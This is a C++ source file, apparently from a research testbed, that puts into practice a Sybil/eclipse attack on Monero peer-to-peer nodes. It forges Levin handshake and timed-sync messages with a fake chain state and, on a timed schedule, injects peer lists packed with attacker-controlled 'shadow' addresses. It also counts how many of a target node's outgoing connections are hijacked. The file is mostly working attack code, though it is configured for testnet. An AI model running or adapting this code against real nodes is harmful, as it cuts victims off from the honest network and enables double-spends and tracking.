//
// Created by ilios on 21. 2. 15..
//
#include <iostream>
#include "MoneroNodePrimitives.h"
#include <random>
#include <algorithm>

// monero-specific data management
#include <p2p/net_node.h>
#include "cryptonote_core/cryptonote_core.h"
#include <cryptonote_protocol/cryptonote_protocol_handler.h>
#include <cryptonote_protocol/cryptonote_protocol_handler.inl>
#include <daemon/core.h>
#include <storages/portable_storage_template_helper.h>
#include <net/levin_base.h>

using namespace sybiltest;
using namespace std;

// to deal with peerlist
static nodetool::peerlist_entry create_peerlist_entry(std::string _ip_str, int _port) {
//    nodetool::peerlist_entry ple;

    std::uint32_t ip = inet_addr(_ip_str.c_str());
    if(INADDR_NONE == ip)
    {
        std::cout << "inet_addr failed" << "\n";
        exit(-1);
    }
    epee::net_utils::ipv4_network_address ipv4_netaddr{ip, (uint16_t) _port};

    epee::net_utils::network_address na{ipv4_netaddr};
    nodetool::peerlist_entry ple{na};
    ple.last_seen = 0;
    return ple;
}

template<class t_in_type>
static boost::value_initialized<t_in_type> parse_rawstream_into_struct(const epee::span<const uint8_t> in_buff) {
    epee::serialization::portable_storage strg;
    if (!strg.load_from_binary(in_buff)) {
        std::cout << "Failed to load_from_binary" << "\n";
        exit(-1);
    }
    boost::value_initialized<t_in_type> in_struct;
    if (!static_cast<t_in_type &>(in_struct).load(strg)) {
        std::cout << "Failed to load in_struct " << "\n";
        exit(-1);
    }

    return in_struct;
}

template<class t_out_type>
static std::string
get_msgstr_from_struct(t_out_type &rsp, int command, uint32_t flags, bool response_required = false) {
    std::string return_buff;

    epee::serialization::portable_storage strg_out;
    rsp.store(strg_out);

    if (!strg_out.store_to_binary(return_buff)) {
        std::cout << "Failed to store_to_binary" << "\n";
        exit(-1);
    }

    epee::levin::bucket_head2 head = epee::levin::make_header(command, return_buff.size(),
                                                              flags, response_required);
    if (flags == LEVIN_PACKET_RESPONSE)
        head.m_return_code = SWAP32LE(1); // return value of invoke function for this command
    return_buff.insert(0, reinterpret_cast<const char *>(&head), sizeof(head));

    return return_buff;
}

void MoneroNodePrimitives::OpAfterConnect(int conn_fd) {
    cout << "OpAfterConnect for node [" << GetIP() << "]" << "\n";
    switch (_type) {
        case NodeType::Attacker: {
            typedef cryptonote::t_cryptonote_protocol_handler<cryptonote::core> t_protocol_raw;
            typedef nodetool::node_server<t_protocol_raw> t_node_server;
            typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::request t_req;
            t_req arg;
            arg.node_data.peer_id = crypto::rand<uint64_t>();
            arg.node_data.my_port = 38080; // listening port
            arg.node_data.rpc_port = 0;
            arg.node_data.rpc_credits_per_hash = 0;
            memcpy(&arg.node_data.network_id, &::config::testnet::NETWORK_ID, 16);

            arg.payload_data.top_version = 1;
            arg.payload_data.top_id = {72, -54, 124, -45, -56, -34, 91, 106, 77, 83, -46, -122, 31, -67, -82, -36, -95,
                                       65, 85, 53, 89, -7, -66, -107, 32, 6, -128, 83, -51, -88, 67, 11};
            arg.payload_data.current_height = 1;
            arg.payload_data.cumulative_difficulty = 1;
            arg.payload_data.cumulative_difficulty_top64 = 0;
            arg.payload_data.pruning_seed = 0;

            uint32_t command = nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::ID;
            std::string buff_to_send = get_msgstr_from_struct<t_req>(arg, command, LEVIN_PACKET_REQUEST, true);

            SendMsgUsingMsgHdr(conn_fd, buff_to_send);


//            boost::program_options::variables_map vm;
//            daemonize::t_core core{vm};
//            t_protocol_raw m_protocol{core.get(), nullptr, false};

            break;
        }
        case NodeType::Benign:
        case NodeType::Shadow: {
            assert(-1);
            break;
        }
    }
}

void MoneroNodePrimitives::OpAfterConnected(int data_fd) {
    // do nothing
    if (_type == NodeType::Benign) {
        _attackStat->benignNodeConnNum++;
    }
    else if (_type == NodeType::Shadow) {
        _attackStat->shadowNodeConnNum++;
    }
    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    auto tm = *std::localtime(&now);
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    std::string timestr = oss.str();
    std::cout << timestr << ",Node (socket) connected : " << GetIP() << ", benignNodeConnNum=" << _attackStat->benignNodeConnNum
              << ", shadowNodeConnNum=" << _attackStat->shadowNodeConnNum << "\n";
}

void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
    // recv to RecvBuffer
    TCPControl &tcpControl = GetTCPControl(data_fd);
    tcpControl.AppendToRecvBuffer(recv_str);

    // get all received data stream
    string &recvbufstr = tcpControl.GetRecvBuffer();

    cout << "opafterRecv" << "\n";

    while (recvbufstr.size() > 0) {
        epee::net_utils::buffer m_cache_in_buffer;
        m_cache_in_buffer.append(recvbufstr.data(), recvbufstr.size());
        if (m_cache_in_buffer.size() < sizeof(epee::levin::bucket_head2)) {
            // header is not fully received
            return;
        }
        epee::levin::bucket_head2 &phead = *(epee::levin::bucket_head2 *) m_cache_in_buffer.span(
                sizeof(epee::levin::bucket_head2)).data();
        int command = phead.m_command;

        if (LEVIN_SIGNATURE != phead.m_signature)
            return;
        int headerReadSize = sizeof(epee::levin::bucket_head2);
        m_cache_in_buffer.erase(headerReadSize);


        if (m_cache_in_buffer.size() < phead.m_cb) {
            // body is not fully received
            return;
        }
        int msgReadSize = phead.m_cb;
        epee::span<const uint8_t> buff_to_invoke = m_cache_in_buffer.carve((std::string::size_type) phead.m_cb);

        if (!(phead.m_flags & (LEVIN_PACKET_REQUEST | LEVIN_PACKET_RESPONSE))) {
            std::cout << "unrecognized monero packet received" << "\n";
            exit(-1);
        }

        bool is_response = phead.m_flags & LEVIN_PACKET_RESPONSE;
        if (is_response) {
            // when the packet is response packet
            // Following commands
            // P2P_COMMANDS_POOL_BASE + 1 : COMMAND_HANDSHAKE_T (1001)
            // P2P_COMMANDS_POOL_BASE + 7 : COMMAND_REQUEST_SUPPORT_FLAGS (1007)
        } else {
            if (phead.m_have_to_return_data) {
                // command_handler->invoke
                // command needs a reply, so we need to handle the command
                // For example, node might receive following commands
                // P2P_COMMANDS_POOL_BASE + 7 : COMMAND_REQUEST_SUPPORT_FLAGS (1007)
                // P2P_COMMANDS_POOL_BASE + 2 : COMMAND_TIMED_SYNC_T (1002)
                std::string return_buff;
                switch (command) {
                    case P2P_COMMANDS_POOL_BASE + 2 : {
                        typedef nodetool::COMMAND_TIMED_SYNC_T<cryptonote::CORE_SYNC_DATA> COMMAND_TIMED_SYNC;
                        typedef COMMAND_TIMED_SYNC::request t_req;
                        typedef COMMAND_TIMED_SYNC::response t_resp;
                        cout << "Received COMMAND_TIMED_SYNC_T message"
                             << ", NodeIP:" << GetIP() << "\n";

                        if (_type == NodeType::Shadow && !_informed) {

                            // print attack success message
                            cout
                                    << "Interception of target node's outgoing connection is confirmed"
                                    << ", Shadow NodeIP:" << GetIP() << "\n";
                            // update attack statistics
                            _attackStat->IncrementHijackedOutgoingConnNum();
                            _informed = true;

                            std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
                            auto tm = *std::localtime(&now);
                            std::ostringstream oss;
                            oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
                            std::string timestr = oss.str();
                            std::cout << timestr << ",outgoing connection hijacked : " << GetIP()
                                      << ", hijackedOutgoingNum=" << _attackStat->GetHijackedOutgoingConnNum() << "\n";
                        }

                        boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(buff_to_invoke);

                        // fill response
                        // std::vector<nodetool::peerlist_entry> local_peerlist_new;
                        // local_peerlist_new.reserve(1);
                        // static_cast<t_resp &>(out_struct).local_peerlist_new.
                        t_resp rsp;
                        rsp.payload_data.current_height = 1;
                        rsp.payload_data.top_id = {72, -54, 124, -45, -56, -34, 91, 106, 77, 83, -46, -122, 31, -67,
                                                   -82, -36, -95,
                                                   65, 85, 53, 89, -7, -66, -107, 32, 6, -128, 83, -51, -88, 67, 11};
                        rsp.payload_data.cumulative_difficulty = 1;
                        rsp.payload_data.cumulative_difficulty_top64 = 0;
                        rsp.payload_data.pruning_seed = 0;

                        if (_type == NodeType::Attacker) {
                            if (_addr_ip_list.size() > 0) {
                                for (auto &ple : _addr_ip_list)
                                    rsp.local_peerlist_new.push_back(ple);
                                _addr_ip_list.clear();
                            }
                        }

                        return_buff = get_msgstr_from_struct(rsp, P2P_COMMANDS_POOL_BASE + 2, LEVIN_PACKET_RESPONSE);

                        SendMsgUsingMsgHdr(data_fd, return_buff);
                        break;
                    }
                    case P2P_COMMANDS_POOL_BASE + 7 : {
                        typedef nodetool::COMMAND_REQUEST_SUPPORT_FLAGS::request t_req;
                        typedef nodetool::COMMAND_REQUEST_SUPPORT_FLAGS::response t_resp;

                        boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(buff_to_invoke);

                        t_resp rsp;
                        // in function handle_get_support_flags, set rsp.support_flags as 1
                        // I don't know the meaning of value 1
                        rsp.support_flags = 1;

                        return_buff = get_msgstr_from_struct(rsp, P2P_COMMANDS_POOL_BASE + 7, LEVIN_PACKET_RESPONSE);

                        SendMsgUsingMsgHdr(data_fd, return_buff);
                        break;
                    }
                    case P2P_COMMANDS_POOL_BASE + 1: {
                        if (_type == NodeType::Shadow || _type == NodeType::Benign) {
                            typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::request t_req;
                            typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::response t_resp;

                            boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(
                                    buff_to_invoke);

                            t_resp rsp;
                            rsp.node_data.peer_id = crypto::rand<uint64_t>();
                            rsp.node_data.my_port = 28080;
                            rsp.node_data.rpc_port = 0;
                            rsp.node_data.rpc_credits_per_hash = 0;
                            memcpy(&rsp.node_data.network_id, &::config::testnet::NETWORK_ID, 16);

                            rsp.payload_data.top_version = 1;
                            rsp.payload_data.top_id = {72, -54, 124, -45, -56, -34, 91, 106, 77, 83, -46, -122, 31, -67,
                                                       -82, -36, -95,
                                                       65, 85, 53, 89, -7, -66, -107, 32, 6, -128, 83, -51, -88, 67,
                                                       11};
                            rsp.payload_data.current_height = 1;
                            rsp.payload_data.cumulative_difficulty = 1;
                            rsp.payload_data.cumulative_difficulty_top64 = 0;
                            rsp.payload_data.pruning_seed = 0;

                            std::string response = get_msgstr_from_struct<t_resp>(rsp, P2P_COMMANDS_POOL_BASE + 1,
                                                                                  LEVIN_PACKET_RESPONSE);
                            SendMsgUsingMsgHdr(data_fd, response);
                        }
                        break;
                    }
//                    case nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::ID:
//                    {
//                        typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA> COMMAND_HANDSHAKE;
//                        typedef COMMAND_HANDSHAKE::request t_req;
//                        typedef COMMAND_HANDSHAKE::response t_resp;
//                        epee::serialization::portable_storage strg;
//                        if (!strg.load_from_binary(buff_to_invoke)) {
//                            std::cout << "Failed to load_from_binary in command " << command << "\n";
//                            exit(-1);
//                        }
//                        boost::value_initialized<t_req> in_struct;
//                        boost::value_initialized<t_resp> out_struct;
//                        if (!static_cast<t_req&>(in_struct).load(strg)) {
//                            std::cout << "Failed to load in_struct in command " << command << "\n";
//                            exit(-1);
//                        }
//
//                        // try_ping? back_ping? at handle_handshake
//                    }
                    default:
                        break;
                }
            } else {
                // packet doesn't need a reply. So ignore it
                // For example, node might receive following commands
                // BC_COMMANDS_POOL_BASE + 10 : NOTIFY_GET_TXPOOL_COMPLEMENT (2010)
            }

        }



//        int command;
//        COMMAND::ID == command
//        typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::request t_req;
//        typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::response t_resp;
//        epee::serialization::portable_storage strg;
//        if(!strg.load_from_binary(epee::strspan<uint8_t>(recvbufstr)))
//        {
//            std::cout << "Failed to load_from_binary" << "\n";
//            return;
//        }
//        typename COMMAND::request, typename COMMAND::response
//        boost::value_initialized<t_in_type> in_struct;
//        boost::value_initialized<t_out_type> out_struct;
//
//        if (!static_cast<t_in_type&>(in_struct).load(strg))
//        {
//            on_levin_traffic(context, false, false, true, in_buff.size(), command);
//            LOG_ERROR("Failed to load in_struct in command " << command);
//            return -1;
//        }
//        on_levin_traffic(context, false, false, false, in_buff.size(), command);


        // first, dump a message header

        // second, dump a message

        // third, parse a message

        // Maybe, recvBuffer can be updated more efficiently. (minimizing a duplication)
        std::string remain = recvbufstr.substr(headerReadSize + msgReadSize);
        tcpControl.SetRecvBuffer(remain);

        // repeating the process until there is remaining data stream in RecvBuffer
        recvbufstr = tcpControl.GetRecvBuffer();
    }
}

void MoneroNodePrimitives::OpAfterDisconnect() {
    if (_type == NodeType::Shadow && _informed) {
        // update attack statistics
        _attackStat->DecrementHijackedOutgoingConnNum();
        _informed = false;

        std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        auto tm = *std::localtime(&now);
        std::ostringstream oss;
        oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
        std::string timestr = oss.str();
        std::cout << timestr << ",outgoing connection hijacked disconnected : " << GetIP()
                  << ", hijackedOutgoingNum=" << _attackStat->GetHijackedOutgoingConnNum() << "\n";
    }

    if (_type == NodeType::Benign) {
        _attackStat->benignNodeConnNum--;
    }
    else if (_type == NodeType::Shadow) {
        _attackStat->shadowNodeConnNum--;
    }
    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    auto tm = *std::localtime(&now);
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    std::string timestr = oss.str();

    std::cout << timestr << ",Node (socket) disconnected : " << GetIP() << ", benignNodeConnNum=" << _attackStat->benignNodeConnNum
              << ", shadowNodeConnNum=" << _attackStat->shadowNodeConnNum << "\n";
}

void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::duration preparePhaseDuration,
                                                  int periodLength, double ipPerSec, double shadowRate) {
    auto now = chrono::system_clock::now();
    auto attack_start_time = _setupTime + preparePhaseDuration;

    vector<string> &vReachableIP = _ipdb->GetVReachableIP();
    vector<string> &vUnreachIP = _ipdb->GetVUnreachableIP();
    vector<string> &vShadowIP = _ipdb->GetVShadowIP();

    vector<string> vAddr;

    if (now < attack_start_time) {
        // if it's prepare phase
        int totalIPCount = 1000;
        int legiIPcount = totalIPCount * 0.3;
        int unreLegiIPcount = totalIPCount * 0.7;

        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
        if (!vReachableIP.empty())
            sample(vReachableIP.begin(), vReachableIP.end(), back_inserter(vAddr), legiIPcount,
                   mt19937{random_device{}()});
        if (!vUnreachIP.empty())
            sample(vUnreachIP.begin(), vUnreachIP.end(), back_inserter(vAddr), unreLegiIPcount,
                   mt19937{random_device{}()});
    } else {
        // if it's attack phase
        int totalIPCount = std::min(1000, (int) (periodLength * ipPerSec));
        int legiIPcount = totalIPCount * (1 - shadowRate) * 0.3;
        int unreLegiIPcount = totalIPCount * (1 - shadowRate) * 0.7;
        int shadowIPcount = totalIPCount * shadowRate;

        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
        shadowIPcount = min(shadowIPcount, (int) vShadowIP.size());

        if (!vReachableIP.empty())
            std::sample(vReachableIP.begin(), vReachableIP.end(), std::back_inserter(vAddr), legiIPcount,
                        std::mt19937{std::random_device{}()});
        if (!vUnreachIP.empty())
            std::sample(vUnreachIP.begin(), vUnreachIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
                        std::mt19937{std::random_device{}()});
        if (!vShadowIP.empty())
            std::sample(vShadowIP.begin(), vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
                        std::mt19937{std::random_device{}()});
        std::cout << "debug print start (attack phase)" << "\n";
        std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount
                  << ", shadowIPcount:" << shadowIPcount << "\n";
    }

    // assume a single data socket
    assert(_mTCPControl.size() == 1);
    int data_fd = _mTCPControl.begin()->first;

    // append to addr peerlist
    _addr_ip_list.clear();
    for (std::string ip : vAddr) {
        nodetool::peerlist_entry ple = create_peerlist_entry(ip, 28080);
        _addr_ip_list.push_back(ple);
    }
}